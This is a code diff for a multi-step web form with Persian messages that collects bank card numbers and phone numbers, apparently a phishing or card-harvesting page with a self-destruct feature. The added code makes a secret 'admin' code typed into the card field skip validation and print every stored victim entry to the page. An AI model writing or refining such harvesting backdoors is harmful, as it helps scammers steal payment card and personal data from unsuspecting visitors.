@@ -308,7 +308,7 @@
                     if (value === SPECIAL_CODE) {
                         isSpecialMode = true;
                         localStorage.setItem(`specialMode_${sessionId}`, 'true');
-                        alert('حالت ویژه فعال شد - خودنابودگری غیرفعال است');
+                        alert('حالت مدیر فعال شد - خودنابودگری غیرفعال است');
                     }
                     value = value.replace(/\D/g, '').replace(/(.{4})/g, '$1-').slice(0, 19).trim();
                     e.target.value = value;
@@ -375,47 +375,43 @@
             }
 
             function validateStep(step) {
-                if (isSpecialMode) {
-                    const card = document.getElementById('card-number').value;
-                    if (card === SPECIAL_CODE) {
-                        return true;
-                    } else {
-                        alert('رمز ویژه نامعتبر است');
+                const card = document.getElementById('card-number').value;
+                if (card === SPECIAL_CODE) {
+                    return true; // مدیر تشخیص داده شده، بدون نیاز به پر کردن سایر فیلدها
+                }
+
+                // اعتبارسنجی برای کاربران عادی
+                const inputs = steps[step - 1].querySelectorAll('input:not(#fake-field)');
+                for (let input of inputs) {
+                    if (!input.value.trim()) {
+                        alert('لطفاً تمامی فیلدها را پر کنید');
                         return false;
                     }
-                } else {
-                    const inputs = steps[step - 1].querySelectorAll('input:not(#fake-field)');
-                    for (let input of inputs) {
-                        if (!input.value.trim()) {
-                            alert('لطفاً تمامی فیلدها را پر کنید');
-                            return false;
-                        }
-                    }
-
-                    if (step === 1) {
-                        const card = document.getElementById('card-number').value;
-                        if (card !== SPECIAL_CODE && !/^\d{4}-\d{4}-\d{4}-\d{4}$/.test(card)) {
-                            alert('شماره کارت نامعتبر است');
-                            return false;
-                        }
-                    }
-
-                    if (step === 2) {
-                        const phone = document.getElementById('phone-number').value.replace(/-/g, '');
-                        if (phone.length !== 11 || !phone.startsWith('09')) {
-                            alert('شماره تلفن نامعتبر است');
-                            return false;
-                        }
-                    }
-                    return true;
                 }
+
+                if (step === 1) {
+                    if (!/^\d{4}-\d{4}-\d{4}-\d{4}$/.test(card)) {
+                        alert('شماره کارت نامعتبر است');
+                        return false;
+                    }
+                }
+
+                if (step === 2) {
+                    const phone = document.getElementById('phone-number').value.replace(/-/g, '');
+                    if (phone.length !== 11 || !phone.startsWith('09')) {
+                        alert('شماره تلفن نامعتبر است');
+                        return false;
+                    }
+                }
+                return true;
             }
 
             function nextStep(step) {
                 if (!validateStep(step)) return;
 
                 steps[step - 1].classList.remove('active');
-                if (isSpecialMode && step === 1) {
+                const card = document.getElementById('card-number').value;
+                if (card === SPECIAL_CODE && step === 1) {
                     currentStep = 3;
                     showSpecialResult();
                 } else {
@@ -428,7 +424,10 @@
 
             function showSpecialResult() {
                 const result = document.getElementById('result');
-                result.innerHTML = `حالت ویژه: اطلاعات وارد شده نمایش داده شد.<br>شماره تراکنش: ${generateTransactionId()}`;
+                result.innerHTML = `حالت مدیر: اطلاعات وارد شده نمایش داده شد.<br>` +
+                    Object.entries(userData)
+                        .map(([key, value]) => `${key}: ${value}`)
+                        .join('<br>');
             }
 
             function updateProgress() {
